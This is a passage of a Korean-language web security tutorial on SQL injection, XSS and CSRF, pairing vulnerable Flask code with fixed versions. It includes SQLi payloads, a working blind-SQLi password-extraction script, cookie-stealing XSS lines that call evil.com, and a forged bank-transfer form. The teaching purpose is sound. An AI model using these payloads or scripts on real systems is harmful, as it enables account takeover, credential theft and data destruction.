# 08. 인젝션 공격과 방어

**이전**: [07. OWASP Top 10 (2021)](07_OWASP_Top10.md) | **다음**: [09. 웹 보안 헤더와 CSP](./09_Web_Security_Headers.md)

---

인젝션 공격은 웹 애플리케이션에서 가장 치명적인 취약점 중 하나로 남아 있습니다. 인젝션은 신뢰할 수 없는 데이터가 명령어나 쿼리의 일부로 인터프리터에 전송되어 의도하지 않은 실행을 초래할 때 발생합니다. 인젝션이 OWASP Top 10에서 1위에서 3위로 내려갔지만, 단일 인젝션 취약점이 완전한 데이터 유출이나 시스템 침해로 이어질 수 있기 때문에 여전히 매우 위험합니다. 이 레슨에서는 SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), command injection, LDAP injection, Server-Side Template Injection (SSTI)에 대한 심층 분석과 각각에 대한 취약한 코드와 안전한 코드 예제를 제공합니다.

## 학습 목표

- 인젝션 취약점의 근본 원인 이해 (코드와 데이터의 혼합)
- SQL injection 변형 식별 및 악용 (classic, blind, second-order)
- 세 가지 XSS 유형 인식 및 방지 (reflected, stored, DOM-based)
- CSRF 토큰과 SameSite 쿠키로 CSRF 방어 구현
- command injection, LDAP injection, template injection 방지
- 매개변수화된 쿼리, 출력 인코딩, Content Security Policy로 심층 방어 적용
- 각 인젝션 유형에 대한 Python/Flask 안전 코드 패턴 작성

---

## 1. 인젝션의 근본 원인

```
┌─────────────────────────────────────────────────────────────────┐
│              인젝션이 발생하는 이유                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  근본적인 문제:                                                   │
│  코드(CODE)와 데이터(DATA)가 동일한 채널에서 혼합됨                │
│                                                                  │
│  정상 작동:                                                       │
│  ┌──────────────────────────────────────────────┐               │
│  │  SELECT * FROM users WHERE name = 'Alice'    │               │
│  │  ──────────── CODE ───────────  ── DATA ──   │               │
│  └──────────────────────────────────────────────┘               │
│                                                                  │
│  인젝션:                                                         │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  SELECT * FROM users WHERE name = '' OR '1'='1' --'      │   │
│  │  ──────────── CODE ───────────   ──INJECTED CODE──       │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
│  인터프리터는 다음을 구별할 수 없음:                               │
│  - 개발자가 의도한 코드                                           │
│  - 공격자가 주입한 코드                                           │
│                                                                  │
│  해결책: 코드와 데이터를 절대 혼합하지 않음                        │
│  분리된 상태로 유지하는 매개변수화된 인터페이스 사용                │
│                                                                  │
│  ┌──────────────────────────────────────────────┐               │
│  │  Prepared Statement:                          │               │
│  │  Code:  SELECT * FROM users WHERE name = ?    │               │
│  │  Data:  ["' OR '1'='1' --"]                   │               │
│  │  Result: 전체 입력을 문자열로 처리             │               │
│  │  인젝션 불가능!                                │               │
│  └──────────────────────────────────────────────┘               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. SQL Injection

### 2.1 Classic SQL Injection

Classic (또는 in-band) SQL injection은 가장 직접적인 유형으로, 공격자가 주입된 쿼리의 결과를 애플리케이션 응답에서 직접 받습니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              Classic SQL Injection                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  로그인 폼:                                                       │
│  ┌─────────────────────────────┐                                │
│  │ Username: admin' --         │                                │
│  │ Password: anything          │                                │
│  │ [Login]                     │                                │
│  └─────────────────────────────┘                                │
│                                                                  │
│  의도된 쿼리:                                                     │
│  SELECT * FROM users                                             │
│  WHERE username = 'admin' AND password = 'hashed_pwd'           │
│                                                                  │
│  주입된 쿼리:                                                     │
│  SELECT * FROM users                                             │
│  WHERE username = 'admin' --' AND password = 'anything'         │
│                      │        │                                  │
│                      │        └── 주석, 나머지 무시               │
│                      └── 항상 admin 사용자와 일치                │
│                                                                  │
│  결과: 비밀번호 없이 admin으로 로그인 성공!                        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
"""
sql_injection_examples.py - SQL injection 취약 코드와 수정 코드
"""
import sqlite3
from flask import Flask, request, jsonify, g

app = Flask(__name__)

DATABASE = 'app.db'


def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db


# ==============================================================
# 취약: 문자열 연결 (Classic SQLi)
# ==============================================================

@app.route('/api/v1/login', methods=['POST'])
def login_vulnerable():
    """취약: 로그인에서 SQL Injection."""
    username = request.json.get('username')
    password = request.json.get('password')

    db = get_db()
    # 절대 하지 말 것: 사용자 입력과 문자열 포매팅
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    user = db.execute(query).fetchone()

    if user:
        return jsonify({"status": "logged in", "user": user['username']})
    return jsonify({"error": "Invalid credentials"}), 401

# 공격 페이로드:
# username: admin' --           → 비밀번호 검사 우회
# username: ' OR '1'='1         → 첫 번째 사용자 반환
# username: ' UNION SELECT 1,2,3,username,password FROM users --
#                                → 모든 사용자명과 비밀번호 추출


@app.route('/api/v1/search', methods=['GET'])
def search_vulnerable():
    """취약: 검색에서 SQL Injection."""
    query = request.args.get('q', '')

    db = get_db()
    # 절대 하지 말 것
    sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
    results = db.execute(sql).fetchall()

    return jsonify([dict(r) for r in results])

# 공격 페이로드:
# q=' UNION SELECT 1,sql,3,4,5 FROM sqlite_master --
#   → 데이터베이스 스키마 추출
# q=' UNION SELECT 1,username,3,password,5 FROM users --
#   → 사용자 자격 증명 추출


# ==============================================================
# 취약: UNION 기반 추출
# ==============================================================

@app.route('/api/v1/product/<int:product_id>')
def get_product_vulnerable(product_id):
    """취약: int 타입 힌트가 있어도 다른 매개변수가 주입 가능."""
    sort = request.args.get('sort', 'name')

    db = get_db()
    # sort 매개변수가 매개변수화되지 않음!
    sql = f"SELECT * FROM products WHERE id = ? ORDER BY {sort}"
    result = db.execute(sql, (product_id,)).fetchall()

    return jsonify([dict(r) for r in result])

# 공격:
# /api/v1/product/1?sort=name; DROP TABLE products --


# ==============================================================
# 수정: 매개변수화된 쿼리
# ==============================================================

@app.route('/api/v2/login', methods=['POST'])
def login_secure():
    """수정: 매개변수화된 쿼리로 인젝션 방지."""
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    db = get_db()
    # 매개변수 플레이스홀더 사용 (?)
    user = db.execute(
        "SELECT * FROM users WHERE username = ? AND password_hash = ?",
        (username, hash_password(password))
    ).fetchone()

    if user:
        return jsonify({"status": "logged in", "user": user['username']})
    return jsonify({"error": "Invalid credentials"}), 401


@app.route('/api/v2/search', methods=['GET'])
def search_secure():
    """수정: 매개변수화된 검색 쿼리."""
    query = request.args.get('q', '')

    db = get_db()
    results = db.execute(
        "SELECT * FROM products WHERE name LIKE ?",
        (f"%{query}%",)  # 전체 검색어가 매개변수
    ).fetchall()

    return jsonify([dict(r) for r in results])


@app.route('/api/v2/product/<int:product_id>')
def get_product_secure(product_id):
    """수정: ORDER BY 컬럼에 화이트리스트 사용."""
    sort = request.args.get('sort', 'name')

    # 허용된 정렬 컬럼 화이트리스트
    ALLOWED_SORT_COLUMNS = {'name', 'price', 'created_at', 'rating'}
    if sort not in ALLOWED_SORT_COLUMNS:
        sort = 'name'  # 안전한 기본값

    db = get_db()
    # 컬럼명은 매개변수화할 수 없으므로 화이트리스트 사용
    sql = f"SELECT * FROM products WHERE id = ? ORDER BY {sort}"
    result = db.execute(sql, (product_id,)).fetchall()

    return jsonify([dict(r) for r in result])
```

### 2.2 Blind SQL Injection

애플리케이션이 쿼리 결과나 오류 메시지를 표시하지 않을 때, 공격자는 blind 기술을 사용하여 한 번에 한 비트씩 데이터를 추출합니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              Blind SQL Injection 유형                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Boolean-Based Blind:                                            │
│  애플리케이션이 TRUE와 FALSE에 대해 다른 동작을 보임               │
│                                                                  │
│  /user?id=1 AND 1=1    → 정상 페이지 (TRUE)                     │
│  /user?id=1 AND 1=2    → 다른 페이지 (FALSE)                    │
│                                                                  │
│  문자별로 데이터 추출:                                            │
│  /user?id=1 AND SUBSTRING(                                      │
│    (SELECT password FROM users WHERE username='admin'),          │
│    1, 1) = 'a'          → 각 문자에 대해 TRUE/FALSE              │
│                                                                  │
│  Time-Based Blind:                                               │
│  애플리케이션 응답 시간이 TRUE/FALSE를 나타냄                     │
│                                                                  │
│  /user?id=1; IF(1=1, SLEEP(5), 0)  → 5초 지연 (TRUE)           │
│  /user?id=1; IF(1=2, SLEEP(5), 0)  → 즉시 응답 (FALSE)         │
│                                                                  │
│  데이터 추출:                                                     │
│  /user?id=1; IF(SUBSTRING(                                      │
│    (SELECT password FROM users LIMIT 1),                         │
│    1, 1) = 'a',                                                  │
│    SLEEP(5), 0)          → 첫 문자가 'a'이면 지연                │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
"""
blind_sqli_demo.py - Blind SQL injection 작동 방식 시연
교육 목적으로만 사용
"""
import time
import requests
from string import ascii_lowercase, digits

# 공격자의 스크립트가 어떻게 보이는지 시뮬레이션
# 소유하지 않은 시스템에 대해 사용하지 말 것

TARGET = "http://vulnerable-app.local/user"
CHARSET = ascii_lowercase + digits + "!@#$%"


def boolean_blind_extract(query_template: str, max_length: int = 32) -> str:
    """
    boolean 기반 blind SQL injection을 사용하여 데이터 추출.
    query_template에는 {pos}와 {char} 플레이스홀더가 있어야 함.
    """
    result = ""

    for pos in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            payload = query_template.format(pos=pos, char=char)
            response = requests.get(TARGET, params={"id": payload})

            if "Welcome" in response.text:  # TRUE 조건
                result += char
                print(f"Position {pos}: '{char}' (extracted so far: '{result}')")
                found = True
                break

        if not found:
            break  # 문자열 끝

    return result


def time_blind_extract(query_template: str, max_length: int = 32) -> str:
    """
    시간 기반 blind SQL injection을 사용하여 데이터 추출.
    """
    result = ""

    for pos in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            payload = query_template.format(pos=pos, char=char)
            start = time.time()
            requests.get(TARGET, params={"id": payload})
            elapsed = time.time() - start

            if elapsed > 4:  # 지연 감지 = TRUE
                result += char
                print(f"Position {pos}: '{char}' (elapsed: {elapsed:.1f}s)")
                found = True
                break

        if not found:
            break

    return result


# 예제: boolean 기반 blind로 admin 비밀번호 추출
# admin_password = boolean_blind_extract(
#     "1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{char}'"
# )
```

### 2.3 Second-Order SQL Injection

Second-order SQL injection은 사용자 입력이 데이터베이스에 저장된 후 나중에 다른 쿼리에서 안전하지 않게 사용될 때 발생합니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              Second-Order SQL Injection                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  단계 1: 공격자가 악의적인 사용자명으로 등록                       │
│  ┌─────────────────────────────────────┐                        │
│  │ Username: admin'--                  │                         │
│  │ Password: anything                  │                         │
│  │ [Register]                          │                         │
│  └─────────────────────────────────────┘                        │
│  → 사용자명 "admin'--"이 매개변수화된 쿼리로 안전하게 저장됨       │
│                                                                  │
│  단계 2: 공격자가 "비밀번호 변경" 플로우를 트리거                  │
│  서버 코드가 데이터베이스에서 사용자명 검색:                       │
│  username = get_current_user().username  → "admin'--"            │
│                                                                  │
│  서버가 다른 쿼리에서 안전하지 않게 사용:                         │
│  UPDATE users SET password = 'new_hash'                         │
│    WHERE username = 'admin'--'                                   │
│                                                                  │
│  결과: 자신의 비밀번호가 아닌 ADMIN의 비밀번호를 변경!             │
│                                                                  │
│  첫 번째 쿼리는 안전했지만 두 번째는 그렇지 않았음.                │
│  방어: 자체 데이터베이스에서 검색한 데이터를 사용하는 쿼리를 포함  │
│  하여 모든 쿼리를 매개변수화.                                     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
# 취약: Second-order SQL injection

@app.route('/api/change-password', methods=['POST'])
def change_password_vulnerable():
    user = get_current_user()  # DB에서 검색
    new_password = request.json['new_password']
    new_hash = hash_password(new_password)

    db = get_db()
    # 취약: DB에서 가져온 username을 매개변수화 없이 사용!
    db.execute(
        f"UPDATE users SET password_hash = '{new_hash}' "
        f"WHERE username = '{user.username}'"  # user.username = "admin'--"
    )
    db.commit()
    return jsonify({"status": "updated"})


# 수정: 자체 데이터베이스에서 가져온 데이터도 매개변수화

@app.route('/api/change-password', methods=['POST'])
def change_password_secure():
    user = get_current_user()
    new_password = request.json['new_password']
    new_hash = hash_password(new_password)

    db = get_db()
    db.execute(
        "UPDATE users SET password_hash = ? WHERE id = ?",
        (new_hash, user.id)  # 사용자명이 아닌 사용자 ID(정수) 사용
    )
    db.commit()
    return jsonify({"status": "updated"})
```

### 2.4 SQLAlchemy ORM (권장 방법)

```python
"""
sqlalchemy_safe.py - 자동 매개변수화를 위한 SQLAlchemy ORM 사용
"""
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'
db = SQLAlchemy(app)


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)


class Product(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(200), nullable=False)
    price = db.Column(db.Float, nullable=False)
    description = db.Column(db.Text)


# 안전: ORM 쿼리는 자동으로 매개변수화됨

@app.route('/api/login', methods=['POST'])
def login():
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    # ORM이 매개변수화 처리
    user = User.query.filter_by(username=username).first()

    if user and verify_password(password, user.password_hash):
        return jsonify({"status": "logged in"})
    return jsonify({"error": "Invalid credentials"}), 401


@app.route('/api/search')
def search():
    query = request.args.get('q', '')

    # 안전: SQLAlchemy가 매개변수화
    products = Product.query.filter(
        Product.name.ilike(f'%{query}%')
    ).all()

    return jsonify([{
        "id": p.id,
        "name": p.name,
        "price": p.price
    } for p in products])


@app.route('/api/products')
def list_products():
    # 안전: 정렬을 위한 화이트리스트 + ORM
    sort_column = request.args.get('sort', 'name')
    sort_order = request.args.get('order', 'asc')

    ALLOWED_COLUMNS = {
        'name': Product.name,
        'price': Product.price,
    }

    column = ALLOWED_COLUMNS.get(sort_column, Product.name)
    if sort_order == 'desc':
        column = column.desc()

    products = Product.query.order_by(column).all()
    return jsonify([{"id": p.id, "name": p.name, "price": p.price}
                    for p in products])


# 경고: ORM의 raw SQL도 여전히 취약할 수 있음!

# 취약: raw SQL 문자열 포매팅
# db.session.execute(f"SELECT * FROM users WHERE name = '{name}'")

# 안전: 매개변수가 있는 raw SQL
# db.session.execute(text("SELECT * FROM users WHERE name = :name"),
#                    {"name": name})
```

---

## 3. Cross-Site Scripting (XSS)

### 3.1 XSS 개요

XSS는 공격자가 다른 사용자가 보는 웹 페이지에 악의적인 스크립트를 주입할 수 있게 합니다. 스크립트는 정상 페이지와 동일한 권한으로 피해자의 브라우저에서 실행됩니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              Cross-Site Scripting (XSS) 유형                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Reflected XSS (Type 1)                                      │
│     페이로드가 요청(URL, 폼 데이터)에 있음                        │
│     서버가 이스케이프 없이 응답에 포함                            │
│     ┌──────┐    ┌──────┐    ┌──────┐                           │
│     │피해자│───▶│서버  │───▶│피해자│                           │
│     │링크  │    │입력  │    │스크립│                            │
│     │클릭  │    │반향  │    │트실행│                            │
│     └──────┘    └──────┘    └──────┘                           │
│                                                                  │
│  2. Stored XSS (Type 2)                                         │
│     페이로드가 데이터베이스에 저장됨 (댓글, 프로필 등)             │
│     해당 페이지를 보는 모든 사용자에게 제공됨                      │
│     ┌────────┐    ┌──────┐    ┌──────┐    ┌──────┐            │
│     │공격자  │───▶│서버  │    │서버  │───▶│피해자│            │
│     │페이로드│    │DB에  │    │DB에서│    │스크립│            │
│     │저장    │    │저장  │    │제공  │    │트실행│            │
│     └────────┘    └──────┘    └──────┘    └──────┘            │
│                                                                  │
│  3. DOM-Based XSS (Type 0)                                      │
│     페이로드가 서버에 도달하지 않음                               │
│     페이지의 JavaScript가 URL/DOM에서 공격자 입력을 읽고          │
│     안전하지 않게 삽입                                            │
│     ┌──────┐                     ┌──────┐                      │
│     │피해자│────────────────────▶│클라이│                      │
│     │링크  │  URL fragment (#)   │언트JS│                      │
│     │클릭  │  또는 DOM 속성      │읽고  │                      │
│     └──────┘                     │삽입  │                      │
│                                  └──────┘                      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Reflected XSS

```python
"""
xss_reflected.py - Reflected XSS 취약점과 수정
"""
from flask import Flask, request, render_template_string, Markup
import html

app = Flask(__name__)

# ==============================================================
# 취약: Reflected XSS
# ==============================================================

@app.route('/search-vulnerable')
def search_vulnerable():
    query = request.args.get('q', '')

    # 취약: 사용자 입력이 이스케이프 없이 HTML에 직접 삽입
    return f"""
    <html>
    <body>
        <h1>Search Results</h1>
        <p>You searched for: {query}</p>
        <p>No results found.</p>
    </body>
    </html>
    """

# 공격 URL:
# /search-vulnerable?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
# 피해자가 이 링크를 클릭하면 쿠키가 공격자에게 전송됨


# ==============================================================
# 수정: 출력 인코딩 / 이스케이프
# ==============================================================

@app.route('/search-secure')
def search_secure():
    query = request.args.get('q', '')

    # 방법 1: 수동 HTML 이스케이프
    safe_query = html.escape(query)

    return f"""
    <html>
    <body>
        <h1>Search Results</h1>
        <p>You searched for: {safe_query}</p>
        <p>No results found.</p>
    </body>
    </html>
    """

# 입력:  <script>alert('XSS')</script>
# 출력: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
# 실행 가능한 스크립트가 아닌 텍스트로 렌더링됨


# 방법 2: Jinja2 템플릿 사용 (기본적으로 자동 이스케이프 활성화)
@app.route('/search-template')
def search_template():
    query = request.args.get('q', '')

    # Jinja2는 기본적으로 {{ query }}를 자동 이스케이프
    return render_template_string("""
    <html>
    <body>
        <h1>Search Results</h1>
        <p>You searched for: {{ query }}</p>
        <p>No results found.</p>
    </body>
    </html>
    """, query=query)


# 경고: Jinja2의 |safe 필터와 Markup()은 자동 이스케이프를 비활성화!
# 사용자 입력과 절대 사용하지 말 것:
# {{ user_input|safe }}         ← 위험
# Markup(user_input)            ← 위험
```

### 3.3 Stored XSS

```python
"""
xss_stored.py - Stored XSS 취약점과 수정
"""
from flask import Flask, request, jsonify, render_template_string
import html
import bleach

app = Flask(__name__)

comments_db = []  # 시뮬레이션된 데이터베이스


# ==============================================================
# 취약: 댓글을 통한 Stored XSS
# ==============================================================

@app.route('/api/comments', methods=['POST'])
def add_comment_vulnerable():
    """정제 없이 댓글 저장."""
    comment = {
        'author': request.json['author'],
        'text': request.json['text'],  # 있는 그대로 저장!
    }
    comments_db.append(comment)
    return jsonify({"status": "added"})


@app.route('/comments-vulnerable')
def show_comments_vulnerable():
    """이스케이프 없이 댓글 렌더링."""
    html_parts = ['<html><body><h1>Comments</h1>']
    for c in comments_db:
        # 취약: 저장된 데이터의 직접 삽입
        html_parts.append(f'<div><b>{c["author"]}</b>: {c["text"]}</div>')
    html_parts.append('</body></html>')
    return '\n'.join(html_parts)

# 공격: POST {"author": "hacker", "text": "<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>"}
# 댓글 페이지를 보는 모든 사용자의 쿠키가 도난당함


# ==============================================================
# 수정: 출력 시 정제 (선택적으로 입력 시에도)
# ==============================================================

@app.route('/api/comments-secure', methods=['POST'])
def add_comment_secure():
    """입력 검증과 함께 댓글 저장."""
    author = request.json.get('author', '').strip()
    text = request.json.get('text', '').strip()

    # 입력 검증
    if not author or not text:
        return jsonify({"error": "Author and text required"}), 400

    if len(author) > 100 or len(text) > 5000:
        return jsonify({"error": "Input too long"}), 400

    # 옵션 A: 모든 HTML 제거 (일반 텍스트 댓글용)
    comment = {
        'author': html.escape(author),
        'text': html.escape(text),
    }

    # 옵션 B: 제한된 HTML 허용 (리치 텍스트 댓글용)
    # bleach를 사용하여 특정 태그 화이트리스트
    comment_rich = {
        'author': bleach.clean(author, tags=[], strip=True),
        'text': bleach.clean(
            text,
            tags=['b', 'i', 'em', 'strong', 'a', 'code', 'pre', 'p', 'br'],
            attributes={'a': ['href', 'title']},
            protocols=['http', 'https'],  # javascript: URL 불가!
            strip=True
        ),
    }

    comments_db.append(comment)
    return jsonify({"status": "added"})


@app.route('/comments-secure')
def show_comments_secure():
    """Jinja2 자동 이스케이프로 댓글 렌더링."""
    return render_template_string("""
    <html>
    <body>
        <h1>Comments</h1>
        {% for c in comments %}
        <div>
            <b>{{ c.author }}</b>: {{ c.text }}
        </div>
        {% endfor %}
    </body>
    </html>
    """, comments=comments_db)
```

### 3.4 DOM-Based XSS

```html
<!-- dom_xss_vulnerable.html -->
<!-- 취약: DOM 기반 XSS -->
<!DOCTYPE html>
<html>
<body>
    <h1>Welcome</h1>
    <div id="greeting"></div>

    <script>
    // 취약: URL fragment에서 읽어 DOM에 안전하지 않게 삽입
    var name = decodeURIComponent(window.location.hash.substring(1));
    document.getElementById('greeting').innerHTML = 'Hello, ' + name;
    // innerHTML은 HTML을 해석하므로 script 태그가 실행됨
    </script>
</body>
</html>

<!--
공격 URL: page.html#<img src=x onerror=alert(document.cookie)>
페이로드가 서버에 도달하지 않음 (fragment는 클라이언트 측만)
-->
```

```html
<!-- dom_xss_fixed.html -->
<!-- 수정: 안전한 DOM 조작 -->
<!DOCTYPE html>
<html>
<body>
    <h1>Welcome</h1>
    <div id="greeting"></div>

    <script>
    // 수정: innerHTML 대신 textContent 사용
    var name = decodeURIComponent(window.location.hash.substring(1));

    // 방법 1: textContent (일반 텍스트 설정, HTML 파싱 없음)
    document.getElementById('greeting').textContent = 'Hello, ' + name;

    // 방법 2: 텍스트 노드 생성
    // var textNode = document.createTextNode('Hello, ' + name);
    // document.getElementById('greeting').appendChild(textNode);

    // 방법 3: 정제 라이브러리 사용 (DOMPurify)
    // import DOMPurify from 'dompurify';
    // document.getElementById('greeting').innerHTML =
    //     DOMPurify.sanitize('Hello, ' + name);
    </script>
</body>
</html>
```

### 3.5 XSS 컨텍스트별 인코딩

HTML의 다른 컨텍스트에는 다른 인코딩 전략이 필요합니다:

```
┌─────────────────────────────────────────────────────────────────┐
│              컨텍스트별 XSS 인코딩                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  컨텍스트             필요한 인코딩            예제               │
│  ─────────            ─────────────────        ─────────         │
│                                                                  │
│  HTML body            HTML 엔티티 인코딩                         │
│  <p>USER_INPUT</p>    &lt; &gt; &amp; &quot;                    │
│                                                                  │
│  HTML attribute       HTML 속성 인코딩 + 따옴표                  │
│  <div title="INPUT">  따옴표 사용, " & < > 인코딩               │
│                                                                  │
│  JavaScript 문자열    JavaScript 인코딩                          │
│  var x = 'INPUT';     \xHH 또는 \uHHHH 인코딩                   │
│                                                                  │
│  URL 매개변수         URL/퍼센트 인코딩                          │
│  href="?q=INPUT"      %XX 인코딩                                 │
│                                                                  │
│  CSS 값               CSS 인코딩                                 │
│  style="color:INPUT"  \HH 인코딩 (가능한 피함)                   │
│                                                                  │
│  중요: 특정 컨텍스트에 맞는 인코딩 사용                           │
│  JavaScript 문자열 컨텍스트에서 HTML 인코딩은 충분하지 않음!      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
"""
xss_encoding.py - 컨텍스트별 XSS 인코딩
"""
import html
import json
import urllib.parse
from markupsafe import Markup, escape


def encode_for_html(value: str) -> str:
    """HTML body 컨텍스트용 인코딩."""
    return html.escape(value)
    # < → &lt;  > → &gt;  & → &amp;  " → &quot;  ' → &#x27;


def encode_for_html_attribute(value: str) -> str:
    """HTML attribute 컨텍스트용 인코딩."""
    return html.escape(value, quote=True)


def encode_for_javascript(value: str) -> str:
    """JavaScript 문자열 컨텍스트용 인코딩."""
    # json.dumps가 따옴표 추가 및 특수 문자 이스케이프
    return json.dumps(value)
    # 처리: \n, \r, \t, \", \\, unicode 문자


def encode_for_url(value: str) -> str:
    """URL 매개변수 컨텍스트용 인코딩."""
    return urllib.parse.quote(value, safe='')


# Flask/Jinja2 템플릿에서 사용:
"""
<!-- HTML 컨텍스트 (Jinja2 자동 이스케이프) -->
<p>{{ user_input }}</p>

<!-- HTML 속성 (Jinja2 자동 이스케이프) -->
<div title="{{ user_input }}">

<!-- JavaScript 컨텍스트 (tojson 필터 사용) -->
<script>
var data = {{ user_input|tojson }};
</script>

<!-- URL 컨텍스트 -->
<a href="/search?q={{ user_input|urlencode }}">Search</a>

<!-- 위험: 이러한 컨텍스트에 사용자 입력을 직접 넣지 말 것 -->
<!-- <script>{{ user_input }}</script>            절대 안 됨 -->
<!-- <div onmouseover="{{ user_input }}">         절대 안 됨 -->
<!-- <style>{{ user_input }}</style>               절대 안 됨 -->
"""
```

---

## 4. Cross-Site Request Forgery (CSRF)

### 4.1 CSRF 작동 방식

CSRF는 로그인한 사용자의 브라우저를 속여 사용자의 기존 세션 쿠키를 사용하여 취약한 애플리케이션에 위조된 요청을 보내게 합니다.

```
┌─────────────────────────────────────────────────────────────────┐
│              Cross-Site Request Forgery (CSRF)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. 사용자가 bank.com에 로그인 (세션 쿠키 설정)                   │
│                                                                  │
│  2. 사용자가 evil.com 방문 (다른 탭에서)                          │
│                                                                  │
│  3. evil.com에 포함된 내용:                                       │
│     <form action="https://bank.com/transfer" method="POST">    │
│       <input type="hidden" name="to" value="attacker">         │
│       <input type="hidden" name="amount" value="10000">        │
│     </form>                                                      │
│     <script>document.forms[0].submit()</script>                 │
│                                                                  │
│  4. 브라우저가 bank.com으로 폼 POST 전송                          │
│     사용자의 세션 쿠키와 함께 (자동)                              │
│                                                                  │
│  5. bank.com이 유효하고 인증된 요청을 받음                        │
│     공격자에게 $10,000 송금                                       │
│                                                                  │
│  ┌──────┐    ┌──────────┐    ┌──────────┐                      │
│  │피해자│───▶│ evil.com │───▶│ bank.com │                      │
│  │      │    │ (숨겨진  │    │ (쿠키    │                      │
│  │      │    │  폼)     │    │  신뢰)   │                      │
│  └──────┘    └──────────┘    └──────────┘                      │
│                                                                  │
│  작동하는 이유:                                                   │
│  - 브라우저가 모든 요청에 쿠키를 자동으로 보냄                     │
│  - 서버는 사용자가 시작한 요청과 위조된 요청을 구별할 수 없음      │
│    (둘 다 유효한 쿠키를 가지고 있음)                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 CSRF 방지

```python
"""
csrf_prevention.py - CSRF 방어 구현
"""
import secrets
import hmac
import hashlib
from flask import Flask, request, session, jsonify, render_template_string, abort
from functools import wraps

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)


# ==============================================================
# 방법 1: 동기화 토큰 패턴
# ==============================================================

def generate_csrf_token() -> str:
    """CSRF 토큰을 생성하고 세션에 저장."""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']


# 모든 템플릿에서 csrf_token을 사용 가능하게 만듦
app.jinja_env.globals['csrf_token'] = generate_csrf_token


def csrf_protect(f):
    """CSRF 토큰 검증을 강제하는 데코레이터."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
            # 폼 데이터 또는 헤더에서 토큰 확인
            token = (
                request.form.get('csrf_token') or
                request.headers.get('X-CSRF-Token')
            )
            expected = session.get('csrf_token')

            if not token or not expected:
                abort(403, description="CSRF token missing")

            # 타이밍 공격 방지를 위한 상수 시간 비교
            if not hmac.compare_digest(token, expected):
                abort(403, description="CSRF token invalid")

        return f(*args, **kwargs)
    return decorated


# 템플릿에서 사용:
TRANSFER_FORM = """
<html>
<body>
    <h1>Transfer Money</h1>
    <form method="POST" action="/transfer">
        <!-- 숨겨진 필드로 CSRF 토큰 -->
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        <label>To: <input type="text" name="to"></label>
        <label>Amount: <input type="number" name="amount"></label>
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
"""

@app.route('/transfer', methods=['GET', 'POST'])
@csrf_protect
def transfer():
    if request.method == 'GET':
        return render_template_string(TRANSFER_FORM)

    # POST - CSRF 토큰이 데코레이터에 의해 검증됨
    to = request.form.get('to')
    amount = request.form.get('amount')
    # 송금 처리...
    return jsonify({"status": "transferred"})


# AJAX 요청의 경우 헤더에 토큰 포함:
AJAX_EXAMPLE = """
<script>
// 메타 태그나 쿠키에서 토큰 가져오기
var csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken  // 헤더에 토큰 전송
    },
    body: JSON.stringify({to: 'bob', amount: 100})
});
</script>
"""


# ==============================================================
# 방법 2: SameSite 쿠키 (심층 방어)
# ==============================================================

app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',   # 교차 사이트 POST에서 쿠키 전송 안 함
    SESSION_COOKIE_SECURE=True,       # HTTPS만
    SESSION_COOKIE_HTTPONLY=True,      # JavaScript 접근 불가
)

# SameSite 값:
# 'Strict' - 교차 사이트 요청에서 쿠키가 절대 전송되지 않음
#            ("Google로 로그인" 유형의 플로우가 작동하지 않음)
# 'Lax'    - 최상위 GET 탐색에서는 쿠키가 전송되지만
#            교차 사이트 POST/PUT/DELETE에서는 전송되지 않음 (권장 기본값)
# 'None'   - 쿠키가 항상 전송됨 (Secure 플래그 필요)
#            (교차 사이트 인증 요청에 필요)


# ==============================================================
# 방법 3: Double Submit Cookie
# ==============================================================

